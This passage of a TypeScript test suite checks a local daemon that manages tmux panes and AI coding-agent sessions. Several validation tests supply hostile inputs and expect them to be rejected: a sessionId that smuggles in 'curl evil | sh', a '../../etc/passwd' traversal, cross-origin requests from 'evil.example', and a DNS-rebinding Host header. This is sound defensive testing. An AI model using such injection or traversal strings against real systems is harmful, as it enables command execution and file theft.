      // capturePane will fail (no tmux), but we can verify the response shape
      expect(data.lines).toBe(50);
    });

    it("should use custom lines param", async () => {
      const { manager, internals } = createServer();
      manager.createSession(
        "s1",
        "/Users/test/.claude/projects/-Users-test-proj/s1.jsonl",
      );
      manager.setTmuxPane("s1", "%1");

      const url = new URL("http://localhost/sessions/s1/screen?lines=100");

      const response = await internals.handleScreenSession("s1", url, {});
      const data = (await response.json()) as { lines: number };

      expect(data.lines).toBe(100);
    });

    it("should fall back to 50 for invalid lines param", async () => {
      const { manager, internals } = createServer();
      manager.createSession(
        "s1",
        "/Users/test/.claude/projects/-Users-test-proj/s1.jsonl",
      );
      manager.setTmuxPane("s1", "%1");

      const url = new URL("http://localhost/sessions/s1/screen?lines=abc");

      const response = await internals.handleScreenSession("s1", url, {});
      const data = (await response.json()) as { lines: number };

      expect(data.lines).toBe(50);
    });

    it("should return session and pane metadata", async () => {
      const { manager, internals } = createServer();
      manager.createSession(
        "s1",
        "/Users/test/.claude/projects/-Users-test-proj/s1.jsonl",
      );
      manager.setTmuxPane("s1", "%1");

      const url = new URL("http://localhost/sessions/s1/screen");

      const response = await internals.handleScreenSession("s1", url, {});
      const data = (await response.json()) as {
        sessionId: string;
        paneId: string;
        content: string;
      };

      expect(data.sessionId).toBe("s1");
      expect(data.paneId).toBe("%1");
      expect(typeof data.content).toBe("string");
    });
  });

  describe("handleActivePaneNotification", () => {
    function postActivePane(
      internals: ServerInternals,
      paneId: string,
    ): Promise<Response> {
      const req = new Request("http://localhost/active-pane", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ paneId }),
      });
      return internals.handleActivePaneNotification(req, {});
    }

    it("should resolve session from pane ID", async () => {
      const { manager, internals } = createServer();
      manager.createSession(
        "s1",
        "/Users/test/.claude/projects/-Users-test-proj/s1.jsonl",
      );
      manager.setTmuxPane("s1", "%10");

      const response = await postActivePane(internals, "%10");
      const data = (await response.json()) as {
        success: boolean;
        sessionId: string | null;
      };

      expect(response.status).toBe(200);
      expect(data.success).toBe(true);
      expect(data.sessionId).toBe("s1");
    });

    it("should return null sessionId for unknown pane", async () => {
      const { internals } = createServer();

      const response = await postActivePane(internals, "%99");
      const data = (await response.json()) as {
        success: boolean;
        sessionId: string | null;
      };

      expect(data.success).toBe(true);
      expect(data.sessionId).toBeNull();
    });

    it("should return 400 for missing paneId", async () => {
      const { internals } = createServer();
      const req = new Request("http://localhost/active-pane", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({}),
      });

      const response = await internals.handleActivePaneNotification(req, {});

      expect(response.status).toBe(400);
    });

    it("should return 400 for invalid JSON", async () => {
      const { internals } = createServer();
      const req = new Request("http://localhost/active-pane", {
        method: "POST",
        body: "not json",
      });

      const response = await internals.handleActivePaneNotification(req, {});

      expect(response.status).toBe(400);
    });

    it("should skip ccmux-owned panes (sidebar, picker)", async () => {
      for (const title of ["ccmux-sidebar", "ccmux-picker"]) {
        const paneCache = new Map<string, TmuxPane>();
        paneCache.set("%5", fakePane({ paneId: "%5", paneTitle: title }));
        const { internals } = createServer(undefined, paneCache);

        const response = await postActivePane(internals, "%5");
        const data = (await response.json()) as {
          success: boolean;
          sessionId: string | null;
        };

        expect(data.success).toBe(true);
        expect(data.sessionId).toBeNull();
      }
    });

    it("should dedup consecutive identical pane IDs", async () => {
      const { manager, internals } = createServer();
      manager.createSession(
        "s1",
        "/Users/test/.claude/projects/-Users-test-proj/s1.jsonl",
      );
      manager.setTmuxPane("s1", "%10");

      // First call sets lastActivePaneId
      await postActivePane(internals, "%10");
      expect(internals.lastActivePaneId).toBe("%10");

      // Second call with same pane should succeed without broadcasting
      const response = await postActivePane(internals, "%10");
      const data = (await response.json()) as { success: boolean };

      expect(data.success).toBe(true);
    });

    it("should update lastActivePaneId on different pane", async () => {
      const { manager, internals } = createServer();
      manager.createSession(
        "s1",
        "/Users/test/.claude/projects/-Users-test-proj/s1.jsonl",
      );
      manager.setTmuxPane("s1", "%10");
      manager.createSession(
        "s2",
        "/Users/test/.claude/projects/-Users-test-proj/s2.jsonl",
      );
      manager.setTmuxPane("s2", "%20");

      await postActivePane(internals, "%10");
      expect(internals.lastActivePaneId).toBe("%10");

      await postActivePane(internals, "%20");
      expect(internals.lastActivePaneId).toBe("%20");
    });

    it("should mark unread session as read when user switches to its pane", async () => {
      const { manager, tracker, internals } = createServer();

      manager.createSession(
        "s1",
        "/Users/test/.claude/projects/-Users-test-proj/s1.jsonl",
      );
      manager.setTmuxPane("s1", "%10");
      manager.setAttentionState("s1", "unread");

      await postActivePane(internals, "%10");

      const session = manager.getSession("s1")!;
      expect(session.attentionState).toBe("read");
      expect(tracker.hasReadTimer("s1")).toBe(true);
    });

    it("should not modify session without attention state on pane switch", async () => {
      const { manager, internals } = createServer();

      manager.createSession(
        "s1",
        "/Users/test/.claude/projects/-Users-test-proj/s1.jsonl",
      );
      manager.setTmuxPane("s1", "%10");

      await postActivePane(internals, "%10");

      const session = manager.getSession("s1")!;
      expect(session.attentionState).toBeNull();
    });
  });

  describe("handleSidebarStateUpdate", () => {
    it("should cache state and return success", async () => {
      const { internals } = createServer();
      const req = new Request("http://localhost/sidebar-state", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          selectedSessionId: "s1",
        }),
      });

      const response = await internals.handleSidebarStateUpdate(req, {});
      const data = (await response.json()) as { success: boolean };

      expect(response.status).toBe(200);
      expect(data.success).toBe(true);
      expect(internals.lastSidebarState).toEqual({
        selectedSessionId: "s1",
        selectedHeaderKey: null,
      });
    });

    it("should return 400 for invalid JSON", async () => {
      const { internals } = createServer();
      const req = new Request("http://localhost/sidebar-state", {
        method: "POST",
        body: "not json",
      });

      const response = await internals.handleSidebarStateUpdate(req, {});

      expect(response.status).toBe(400);
    });

    it("should coerce non-string selectedSessionId to null", async () => {
      const { internals } = createServer();
      const req = new Request("http://localhost/sidebar-state", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          selectedSessionId: 123,
        }),
      });

      await internals.handleSidebarStateUpdate(req, {});

      expect(internals.lastSidebarState.selectedSessionId).toBeNull();
    });

    it("initializes with default state before any update", () => {
      const { internals } = createServer();

      expect(internals.lastSidebarState).toEqual({
        selectedSessionId: null,
        selectedHeaderKey: null,
      });
    });

    it("caches state from last POST", async () => {
      const { internals } = createServer();
      const req = new Request("http://localhost/sidebar-state", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          selectedSessionId: "s2",
        }),
      });

      await internals.handleSidebarStateUpdate(req, {});

      expect(internals.lastSidebarState).toEqual({
        selectedSessionId: "s2",
        selectedHeaderKey: null,
      });
    });

    it("should pass through selectedHeaderKey", async () => {
      const { internals } = createServer();
      const req = new Request("http://localhost/sidebar-state", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          selectedSessionId: null,
          selectedHeaderKey: "my-project",
        }),
      });

      await internals.handleSidebarStateUpdate(req, {});

      expect(internals.lastSidebarState).toEqual({
        selectedSessionId: null,
        selectedHeaderKey: "my-project",
      });
    });

    it("should coerce non-string selectedHeaderKey to null", async () => {
      const { internals } = createServer();
      const req = new Request("http://localhost/sidebar-state", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          selectedSessionId: "s1",
          selectedHeaderKey: 42,
        }),
      });

      await internals.handleSidebarStateUpdate(req, {});

      expect(internals.lastSidebarState.selectedHeaderKey).toBeNull();
    });
  });

  describe("handleInvoke validation", () => {
    function invokeRequest(body: unknown): Request {
      return new Request("http://localhost/invoke", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(body),
      });
    }

    it("rejects malformed invocationId", async () => {
      const { internals } = createServer();
      const res = await internals.handleInvoke(
        invokeRequest({
          invocationId: "../../etc/passwd",
          agent: "claude",
          prompt: "hi",
          cwd: process.cwd(),
        }),
        {},
      );
      expect(res.status).toBe(400);
      const body = (await res.json()) as { message: string };
      expect(body.message).toMatch(/invocationId/);
    });

    it("rejects non-string sessionId", async () => {
      const { internals } = createServer();
      const res = await internals.handleInvoke(
        invokeRequest({
          invocationId: "inv_abcd1234",
          agent: "claude",
          prompt: "hi",
          cwd: process.cwd(),
          sessionId: 42,
        }),
        {},
      );
      expect(res.status).toBe(400);
      const body = (await res.json()) as { message: string };
      expect(body.message).toMatch(/sessionId/);
    });

    it("rejects sessionId with shell metacharacters", async () => {
      const { internals } = createServer();
      const res = await internals.handleInvoke(
        invokeRequest({
          invocationId: "inv_abcd1234",
          agent: "claude",
          prompt: "hi",
          cwd: process.cwd(),
          sessionId: "x; curl evil | sh",
        }),
        {},
      );
      expect(res.status).toBe(400);
      const body = (await res.json()) as { message: string };
      expect(body.message).toMatch(/sessionId/);
    });

    it("rejects prompt over the 256 KB cap", async () => {
      const { internals } = createServer();
      const res = await internals.handleInvoke(
        invokeRequest({
          invocationId: "inv_abcd1234",
          agent: "claude",
          prompt: "a".repeat(256 * 1024 + 1),
          cwd: process.cwd(),
        }),
        {},
      );
      expect(res.status).toBe(400);
      const body = (await res.json()) as { message: string };
      expect(body.message).toMatch(/Prompt exceeds maximum size/);
    });

    it("rejects non-numeric timeoutMs", async () => {
      const { internals } = createServer();
      const res = await internals.handleInvoke(
        invokeRequest({
          invocationId: "inv_abcd1234",
          agent: "claude",
          prompt: "hi",
          cwd: process.cwd(),
          timeoutMs: "300000",
        }),
        {},
      );
      expect(res.status).toBe(400);
      const body = (await res.json()) as { message: string };
      expect(body.message).toMatch(/timeoutMs/);
    });

    it("rejects timeoutMs over the 30 minute cap", async () => {
      const { internals } = createServer();
      const res = await internals.handleInvoke(
        invokeRequest({
          invocationId: "inv_abcd1234",
          agent: "claude",
          prompt: "hi",
          cwd: process.cwd(),
          timeoutMs: 60 * 60 * 1000,
        }),
        {},
      );
      expect(res.status).toBe(400);
    });

    it("rejects non-existent cwd", async () => {
      const { internals } = createServer();
      const res = await internals.handleInvoke(
        invokeRequest({
          invocationId: "inv_abcd1234",
          agent: "claude",
          prompt: "hi",
          cwd: "/this/path/does/not/exist/anywhere",
        }),
        {},
      );
      expect(res.status).toBe(400);
    });

    it("returns hooks_missing for a hooks-requiring agent whose hooks are not installed", async () => {
      const fakeAdapter = {
        agentType: "claude",
        isInstalled: () => false,
      } as unknown as HookAdapter;
      const { internals } = createServer(
        undefined,
        undefined,
        undefined,
        (name) => (name === "claude" ? fakeAdapter : null),
      );
      const res = await internals.handleInvoke(
        invokeRequest({
          invocationId: "inv_abcd1234",
          agent: "claude",
          prompt: "hi",
          cwd: process.cwd(),
        }),
        {},
      );
      expect(res.status).toBe(200);
      const body = (await res.json()) as { kind: string; message: string };
      expect(body.kind).toBe("hooks_missing");
      expect(body.message).toMatch(/ccmux setup --agent claude/);
    });

    it("skips the hooks check for a subprocess agent even when the adapter reports uninstalled", async () => {
      // `capabilitiesFor(cursor, subprocess).requiresHooks === false` is
      // pinned in `invoker.test.ts`. This test asserts the server reads
      // that gate (and not the prior `!agent.invokeMode` shape) so the
      // adapter is never consulted for subprocess invokers. Past the gate
      // the stub invoker throws, surfacing as `unknown` -- the point of
      // the assertion is that we DIDN'T short-circuit on `hooks_missing`
      // and we DIDN'T touch the hook adapter.
      let adapterLookups = 0;
      const fakeAdapter = {
        agentType: "cursor",
        isInstalled: () => false,
      } as unknown as HookAdapter;
      const { internals } = createServer(
        undefined,
        undefined,
        undefined,
        (name) => {
          if (name === "cursor") {
            adapterLookups += 1;
            return fakeAdapter;
          }
          return null;
        },
      );
      const res = await internals.handleInvoke(
        invokeRequest({
          invocationId: "inv_abcd1234",
          agent: "cursor",
          prompt: "hi",
          cwd: process.cwd(),
        }),
        {},
      );
      expect(res.status).toBe(200);
      const body = (await res.json()) as { kind: string };
      expect(body.kind).not.toBe("hooks_missing");
      expect(adapterLookups).toBe(0);
    });

    it("rejects a custom agent without invokeMode with agent_error before reaching the manager", async () => {
      // Custom ccmux.json agent that isn't `claude` and lacks
      // `invokeMode`: `InvocationRegistry.get` returns undefined for it,
      // and the server short-circuits with `agent_error` carrying the
      // word `invokeMode` so existing CLI matchers (and the manager's
      // defense-in-depth `noInvokeModeMessage` template) stay aligned.
      const customAgent: AgentDef = {
        name: "noninvokable",
        shortCode: "nv",
        processMatch: /^never-matches$/,
        terminalRules: [],
      };
      const { internals } = createServer(
        undefined,
        undefined,
        undefined,
        undefined,
        (name) => (name === "noninvokable" ? customAgent : undefined),
      );
      const res = await internals.handleInvoke(
        invokeRequest({
          invocationId: "inv_abcd1234",
          agent: "noninvokable",
          prompt: "hi",
          cwd: process.cwd(),
        }),
        {},
      );
      expect(res.status).toBe(200);
      const body = (await res.json()) as { kind: string; message: string };
      expect(body.kind).toBe("agent_error");
      expect(body.message).toMatch(/invokeMode/);
    });
  });

  describe("handleInvokeCancel validation", () => {
    it("rejects malformed invocationId", async () => {
      const { internals } = createServer();
      const res = await internals.handleInvokeCancel("../../etc/passwd", {});
      expect(res.status).toBe(400);
    });

    it("accepts well-formed invocationId (no-op when nothing in flight)", async () => {
      const { internals } = createServer();
      const res = await internals.handleInvokeCancel("inv_abcd1234", {});
      expect(res.status).toBe(200);
    });
  });
});

describe("rejectCrossOriginBrowser", () => {
  it("rejects POST with Origin header (browser CSRF)", () => {
    const req = new Request("http://localhost/invoke", {
      method: "POST",
      headers: { Origin: "https://evil.example" },
    });
    const res = rejectCrossOriginBrowser(req);
    expect(res).not.toBeNull();
    expect(res!.status).toBe(403);
  });

  it("rejects preflighted OPTIONS for a state-changing method", () => {
    const req = new Request("http://localhost/invoke", {
      method: "OPTIONS",
      headers: {
        Origin: "https://evil.example",
        "Access-Control-Request-Method": "POST",
      },
    });
    const res = rejectCrossOriginBrowser(req);
    expect(res).not.toBeNull();
    expect(res!.status).toBe(403);
  });

  it("rejects DELETE with Origin header", () => {
    const req = new Request("http://localhost/sessions/s1", {
      method: "DELETE",
      headers: { Origin: "https://evil.example" },
    });
    const res = rejectCrossOriginBrowser(req);
    expect(res?.status).toBe(403);
  });

  it("allows POST with no Origin (CLI / Node fetch)", () => {
    const req = new Request("http://localhost/invoke", { method: "POST" });
    expect(rejectCrossOriginBrowser(req)).toBeNull();
  });

  it("allows GET requests even when Origin is present", () => {
    const req = new Request("http://localhost/sessions", {
      method: "GET",
      headers: { Origin: "https://evil.example" },
    });
    expect(rejectCrossOriginBrowser(req)).toBeNull();
  });

  it("does not omit response body so the browser surfaces a readable error", async () => {
    const req = new Request("http://localhost/invoke", {
      method: "POST",
      headers: { Origin: "https://evil.example" },
    });
    const res = rejectCrossOriginBrowser(req);
    const body = await res!.text();
    expect(body).toMatch(/cross-origin/i);
  });
});

describe("rejectNonLoopbackHost", () => {
  it("allows loopback Host values", () => {
    const allowed = [
      "127.0.0.1",
      "127.0.0.1:2269",
      "localhost",
      "localhost:2269",
      "[::1]",
      "[::1]:2269",
      "::1",
    ];
    for (const host of allowed) {
      const req = new Request("http://localhost/sessions", {
        headers: { Host: host },
      });
      expect(rejectNonLoopbackHost(req)).toBeNull();
    }
  });

  it("allows a request with no Host header", () => {
    const req = new Request("http://localhost/sessions");
    expect(rejectNonLoopbackHost(req)).toBeNull();
  });

  it("rejects a non-loopback Host", () => {
    const req = new Request("http://localhost/sessions", {
      headers: { Host: "evil.example" },
    });
    const res = rejectNonLoopbackHost(req);
    expect(res).not.toBeNull();
    expect(res!.status).toBe(403);
  });

  it("rejects a non-loopback Host with a port", () => {
    const req = new Request("http://localhost/sessions", {
      headers: { Host: "evil.example:2269" },
    });
    expect(rejectNonLoopbackHost(req)?.status).toBe(403);
  });

  it("rejects a loopback-prefixed hostname (DNS rebinding via subdomain trick)", () => {
    const req = new Request("http://localhost/sessions", {
      headers: { Host: "127.0.0.1.evil.com" },
    });
    expect(rejectNonLoopbackHost(req)?.status).toBe(403);
  });

  it("rejects a malformed IPv6 Host missing its closing bracket", () => {
    const req = new Request("http://localhost/sessions", {
      headers: { Host: "[evil" },
    });
    expect(rejectNonLoopbackHost(req)?.status).toBe(403);
  });
});

describe("originInvocationId derivation", () => {
  function internalsWithSessionName(sessionName: string): ServerInternals {
    const cache = new Map<string, TmuxPane>([
      [
        "%9",
        fakePane({ paneId: "%9", sessionName, target: `${sessionName}:0.0` }),
      ],
    ]);
    return createServer(undefined, cache).internals;
  }

  it("extracts the invocation id from a ccmux-invoke-<id> session name", async () => {
    const internals = internalsWithSessionName("ccmux-invoke-inv_abc123");
    const enriched = await internals.enrichSession(fakeSession("s1", "%9"));
    expect(enriched.originInvocationId).toBe("inv_abc123");
  });

  it("is null for a normal user session name", async () => {
    const internals = internalsWithSessionName("work");
    const enriched = await internals.enrichSession(fakeSession("s1", "%9"));
    expect(enriched.originInvocationId).toBeNull();
  });

  it("is null when the remainder fails INVOCATION_ID_PATTERN", async () => {
    // A user who happens to name a session ccmux-invoke-foo must not be
    // misread as an invocation.
    const internals = internalsWithSessionName("ccmux-invoke-foo");
    const enriched = await internals.enrichSession(fakeSession("s1", "%9"));
    expect(enriched.originInvocationId).toBeNull();
  });
});

describe("handleInvocationResult", () => {
  it("returns available:false for an unknown id (clean reap-tolerant miss)", async () => {
    const { internals } = createServer();
    const res = await internals.handleInvocationResult("inv_neverwritten", {});
    expect(res.status).toBe(200);
    const body = (await res.json()) as { available: boolean };
    expect(body.available).toBe(false);
  });

  it("rejects an invalid invocationId with 400", async () => {
    const { internals } = createServer();
    const res = await internals.handleInvocationResult("not-an-inv-id", {});
    expect(res.status).toBe(400);
    const body = (await res.json()) as { available: boolean };
    expect(body.available).toBe(false);
  });
});

describe("invocationEventToSSE", () => {
  const runningRecord: InvocationRecord = {
    invocationId: "inv_abcd1234",
    agent: "codex",
    cwd: "/Users/test/Code/myapp",
    startedAt: 1700000000000,
    status: "running",
  };

  it("maps a started event to a flat invocation_started SSE event", () => {
    const event = invocationEventToSSE({
      type: "started",
      record: runningRecord,
    });
    expect(event.type).toBe("invocation_started");
    if (event.type !== "invocation_started") throw new Error("wrong type");
    expect(event.invocationId).toBe("inv_abcd1234");
    expect(event.agent).toBe("codex");
    expect(event.cwd).toBe("/Users/test/Code/myapp");
    // epoch-ms startedAt becomes an ISO string on the wire
    expect(event.startedAt).toBe(new Date(1700000000000).toISOString());
    expect(typeof event.timestamp).toBe("string");
  });

  it("maps a succeeded finish to invocation_finished with durationMs", () => {
    const event = invocationEventToSSE({
      type: "finished",
      record: { ...runningRecord, status: "succeeded", durationMs: 4200 },
    });
    expect(event.type).toBe("invocation_finished");
    if (event.type !== "invocation_finished") throw new Error("wrong type");
    expect(event.status).toBe("succeeded");
    expect(event.durationMs).toBe(4200);
    expect(event.kind).toBeUndefined();
  });

  it("maps a failed finish carrying the error kind", () => {
    const event = invocationEventToSSE({
      type: "finished",
      record: {
        ...runningRecord,
        status: "failed",
        durationMs: 600,
        kind: "agent_error",
      },
    });
    if (event.type !== "invocation_finished") throw new Error("wrong type");
    expect(event.status).toBe("failed");
    expect(event.kind).toBe("agent_error");
  });

  it("maps a cancelled finish", () => {
    const event = invocationEventToSSE({
      type: "finished",
      record: { ...runningRecord, status: "cancelled", kind: "cancelled" },
    });
    if (event.type !== "invocation_finished") throw new Error("wrong type");
    expect(event.status).toBe("cancelled");
  });
});

describe("init event invocation snapshot", () => {
  it("carries active+recent invocations mapped from listInvocations()", async () => {
    const { internals } = createServer();
    // Seed the manager's snapshot; the init builder must project each record
    // to {invocationId, status}. This guards the wiring that feeds the board's
    // reconnect reconciliation (the `onInit` callback's invocations arg is
    // optional, so a dropped third arg or a daemon stopping to populate this
    // would otherwise silently regress with every test still green).
    internals.invocationManager.listInvocations = () => [
      {
        invocationId: "inv_x",
        agent: "codex",
        cwd: "/c",
        startedAt: 1700000000000,
        status: "running",
      },
      {
        invocationId: "inv_y",
        agent: "claude",
        cwd: "/d",
        startedAt: 1700000001000,
        status: "succeeded",
        durationMs: 1000,
      },
    ];
    const res = internals.handleSSE();
    // The SSE stream is `ReadableStream<string>` (sendToClient enqueues the
    // pre-serialized `data: ...` frame), so chunks are strings, not bytes.
    const reader = (res.body as unknown as ReadableStream<string>).getReader();
    try {
      const { value } = await reader.read();
      const text = value ?? "";
      expect(text.startsWith("data: ")).toBe(true);
      const event = JSON.parse(text.slice("data: ".length));
      expect(event.type).toBe("init");
      expect(event.invocations).toEqual([
        { invocationId: "inv_x", status: "running" },
        { invocationId: "inv_y", status: "succeeded" },
      ]);
    } finally {
      await reader.cancel();
    }
  });
});

describe("handleKillAllSessions invoke teardown", () => {
  it("cancels every running invocation and reports the count", async () => {
    const { internals } = createServer();
    // The daemon owns invoke teardown on kill-all: a subprocess invoke has no
    // session for the SIGTERM loop, and a Claude invoke the client never saw
    // start is absent from the client's in-flight set. Seed a mixed snapshot
    // (running subprocess, running Claude, already-finished) and assert only
    // the running ones are cancelled.
    internals.invocationManager.listInvocations = () => [
      {
        invocationId: "inv_codex",
        agent: "codex",
        cwd: "/c",
        startedAt: 1700000000000,
        status: "running",
      },
      {
        invocationId: "inv_claude",
        agent: "claude",
        cwd: "/d",
        startedAt: 1700000001000,
        status: "running",
      },
      {
        invocationId: "inv_done",
        agent: "codex",
        cwd: "/e",
        startedAt: 1700000002000,
        status: "succeeded",
        durationMs: 10,
      },
    ];
    const cancelled: string[] = [];
    internals.invocationManager.cancel = (id: string) => {
      cancelled.push(id);
      return true;
    };
    const res = internals.handleKillAllSessions({});
    const body = (await res.json()) as { cancelledInvocations: number };
    // Exactly the two running invokes are cancelled; the finished record
    // (inv_done) is left alone — cancelling it would seed a stale pre-start-
    // cancel stash, guarded in invocation-manager.cancel.
    expect(cancelled.sort()).toEqual(["inv_claude", "inv_codex"]);
    expect(body.cancelledInvocations).toBe(2);
  });

  it("excludes background (Claude bg-agent) rows from the bulk SIGTERM", () => {
    const { manager, internals } = createServer();
    // A board "kill all" (Shift+X) must not SIGTERM the supervisor-owned pid.
    manager.createBackgroundSession({
      daemonShort: "sup-ka",
      pid: 424242,
      cwd: "/private/tmp",
      logPath: null,
      version: null,
      status: "working",
      attentionType: null,
      pendingTool: null,
      lastPrompt: null,
      lastActivityAt: null,
    });
    const killSpy = spyOn(process, "kill").mockImplementation(() => true);
    try {
      internals.handleKillAllSessions({});
      expect(killSpy).not.toHaveBeenCalledWith(424242, "SIGTERM");
    } finally {
      killSpy.mockRestore();
    }
  });
});

describe("getServerSocketPath and /server-info", () => {
  /**
   * Stub `Bun.spawn` with a queue of `tmux display-message` outcomes ("tmux
   * down" then "up"). Counts invocations so caching (a resolved path must not
   * re-spawn) is observable.
   */
  function withSpawnQueue(outcomes: Array<{ code: number; out: string }>) {
    const original = Bun.spawn;
    const state = { calls: 0 };
    const queue = [...outcomes];
    Bun.spawn = ((..._args: unknown[]) => {
      state.calls++;
      const next = queue.shift() ?? { code: 0, out: "" };
      return {
        exited: Promise.resolve(next.code),
        stdout: new Blob([next.out]).stream(),
        stderr: new Blob([""]).stream(),
      };
    }) as unknown as typeof Bun.spawn;
    return { state, restore: () => (Bun.spawn = original) };
  }

  it("does not cache a null result, retries until tmux resolves, then caches", async () => {
    const { internals } = createServer();
    // (1) tmux down -> exit 1; (2) tmux up -> the real socket path.
    const { state, restore } = withSpawnQueue([
      { code: 1, out: "" },
      { code: 0, out: "/tmp/some-sock\n" },
    ]);
    try {
      // (1) exit != 0 -> null, and the null is NOT cached.
      expect(await internals.getServerSocketPath()).toBe(null);
      expect(state.calls).toBe(1);

      // (2) next lookup succeeds -> trimmed path, now cached.
      expect(await internals.getServerSocketPath()).toBe("/tmp/some-sock");
      expect(state.calls).toBe(2);

      // (3) cached hit returns the same value WITHOUT re-spawning.
      expect(await internals.getServerSocketPath()).toBe("/tmp/some-sock");
      expect(state.calls).toBe(2);
    } finally {
      restore();
    }
  });

  it("serves the resolved socket path as JSON via GET /server-info", async () => {
    const { internals } = createServer();
    const { state, restore } = withSpawnQueue([
      { code: 0, out: "/tmp/route-sock\n" },
    ]);
    try {
      const res = await internals.handleRequest(
        new Request("http://localhost/server-info"),
      );
      const data = (await res.json()) as {
        socketPath: string | null;
        health: DaemonHealth;
      };
      expect(data.socketPath).toBe("/tmp/route-sock");
      // A default (healthy) daemon reports the healthy snapshot.
      expect(data.health).toEqual({ degraded: false });
      // The route resolves through the same cached lookup: one spawn only.
      expect(state.calls).toBe(1);
    } finally {
      restore();
    }
  });

  it("serves the degraded health snapshot via GET /server-info", async () => {
    const degraded: DaemonHealth = {
      degraded: true,
      reason: "ps spawn failed",
      since: "2024-01-15T12:00:00Z",
    };
    const { internals } = createServer(
      undefined,
      undefined,
      undefined,
      undefined,
      undefined,
      undefined,
      undefined,
      () => degraded,
    );
    const { restore } = withSpawnQueue([{ code: 0, out: "/tmp/sock\n" }]);
    try {
      const res = await internals.handleRequest(
        new Request("http://localhost/server-info"),
      );
      const data = (await res.json()) as {
        socketPath: string | null;
        health: DaemonHealth;
      };
      expect(data.health).toEqual(degraded);
    } finally {
      restore();
    }
  });
});

describe("GET /health scan-health", () => {
  it("reports the healthy snapshot by default", () => {
    const { internals } = createServer();
    const res = internals.handleHealth({});
    return res.json().then((data) => {
      expect((data as { health: DaemonHealth }).health).toEqual({
        degraded: false,
      });
    });
  });

  it("reports the degraded snapshot when scans are failing", () => {
    const degraded: DaemonHealth = {
      degraded: true,
      reason: "ps spawn failed",
      since: "2024-01-15T12:00:00Z",
    };
    const { internals } = createServer(
      undefined,
      undefined,
      undefined,
      undefined,
      undefined,
      undefined,
      undefined,
      () => degraded,
    );
    const res = internals.handleHealth({});
    return res.json().then((data) => {
      expect((data as { health: DaemonHealth }).health).toEqual(degraded);
    });
  });
});

describe("POST /notification-action", () => {
  function postBody(body: unknown): Request {
    return new Request("http://localhost/notification-action", {
      method: "POST",
      body: JSON.stringify(body),
    });
  }

  it("extracts sessionId/statusChangedAt from the opaque payload string (the helper's real body shape)", async () => {
    // This is exactly what notifier/Sources/main.swift POSTs: action + a
    // possibly-null userText + the daemon's own opaque `--payload` string
    // (sessionId/statusChangedAt live INSIDE it, not at top level).
    let received: unknown = null;
    const runner = mock(async (input: unknown) => {
      received = input;
      return { code: 200 as const, ok: true, action: "approve" as const };
    });
    const { internals } = createServer(
      undefined,
      undefined,
      undefined,
      undefined,
      undefined,
      undefined,
      runner,
    );
    const res = await internals.handleRequest(
      postBody({
        action: "approve",
        userText: null,
        payload: JSON.stringify({ sessionId: "s1", statusChangedAt: "t" }),
      }),
    );
    expect(res.status).toBe(200);
    expect(await res.json()).toEqual({ ok: true, action: "approve" });
    expect(runner).toHaveBeenCalledTimes(1);
    expect(received).toEqual({
      sessionId: "s1",
      action: "approve",
      statusChangedAt: "t",
      attentionGeneration: undefined,
      userText: undefined,
    });
  });

  it("extracts a numeric attentionGeneration from the opaque payload string", async () => {
    let received: unknown = null;
    const runner = mock(async (input: unknown) => {
      received = input;
      return { code: 200 as const, ok: true, action: "approve" as const };
    });
    const { internals } = createServer(
      undefined,
      undefined,
      undefined,
      undefined,
      undefined,
      undefined,
      runner,
    );
    await internals.handleRequest(
      postBody({
        action: "approve",
        payload: JSON.stringify({
          sessionId: "s1",
          statusChangedAt: "t",
          attentionGeneration: 7,
        }),
      }),
    );
    expect(received).toEqual({
      sessionId: "s1",
      action: "approve",
      statusChangedAt: "t",
      attentionGeneration: 7,
      userText: undefined,
    });
  });

  it("treats a non-numeric attentionGeneration in the payload as absent", async () => {
    let received: { attentionGeneration?: unknown } | null = null;
    const runner = mock(async (input: { attentionGeneration?: unknown }) => {
      received = input;
      return { code: 200 as const, ok: true, action: "approve" as const };
    });
    const { internals } = createServer(
      undefined,
      undefined,
      undefined,
      undefined,
      undefined,
      undefined,
      runner,
    );
    await internals.handleRequest(
      postBody({
        action: "approve",
        payload: JSON.stringify({
          sessionId: "s1",
          statusChangedAt: "t",
          attentionGeneration: "not-a-number",
        }),
      }),
    );
    expect(received!.attentionGeneration).toBeUndefined();
  });

  it("prefers the payload's sessionId/statusChangedAt over top-level fields", async () => {
    let received: unknown = null;
    const runner = mock(async (input: unknown) => {
      received = input;
      return { code: 200 as const, ok: true, action: "approve" as const };
    });
    const { internals } = createServer(
      undefined,
      undefined,
      undefined,
      undefined,
      undefined,
      undefined,
      runner,
    );
    const res = await internals.handleRequest(
      postBody({
        sessionId: "top-level",
        statusChangedAt: "top-t",
        action: "approve",
        payload: JSON.stringify({ sessionId: "s1", statusChangedAt: "t" }),
      }),
    );
    expect(res.status).toBe(200);
    expect(received).toEqual({
      sessionId: "s1",
      action: "approve",
      statusChangedAt: "t",
      userText: undefined,
    });
  });

  it("carries a top-level userText through for an answer", async () => {
    let received: unknown = null;
    const runner = mock(async (input: unknown) => {
      received = input;
      return { code: 200 as const, ok: true, action: "answer" as const };
    });
    const { internals } = createServer(
      undefined,
      undefined,
      undefined,
      undefined,
      undefined,
      undefined,
      runner,
    );
    await internals.handleRequest(
      postBody({
        action: "answer",
        userText: "yes, proceed",
        payload: JSON.stringify({ sessionId: "s1", statusChangedAt: "t" }),
      }),
    );
    expect(received).toEqual({
      sessionId: "s1",
      action: "answer",
      statusChangedAt: "t",
      userText: "yes, proceed",
    });
  });

  it("returns 400 for a malformed payload JSON string without calling the handler", async () => {
    const runner = mock(async () => ({ code: 200 as const, ok: true }));
    const { internals } = createServer(
      undefined,
      undefined,
      undefined,
      undefined,
      undefined,
      undefined,
      runner,
    );
    const res = await internals.handleRequest(
      postBody({ action: "approve", payload: "{ not valid json" }),
    );
    expect(res.status).toBe(400);
    expect(runner).not.toHaveBeenCalled();
  });

  it("accepts top-level sessionId as a fallback when no payload is present (hand-testing)", async () => {
    let received: unknown = null;
    const runner = mock(async (input: unknown) => {
      received = input;
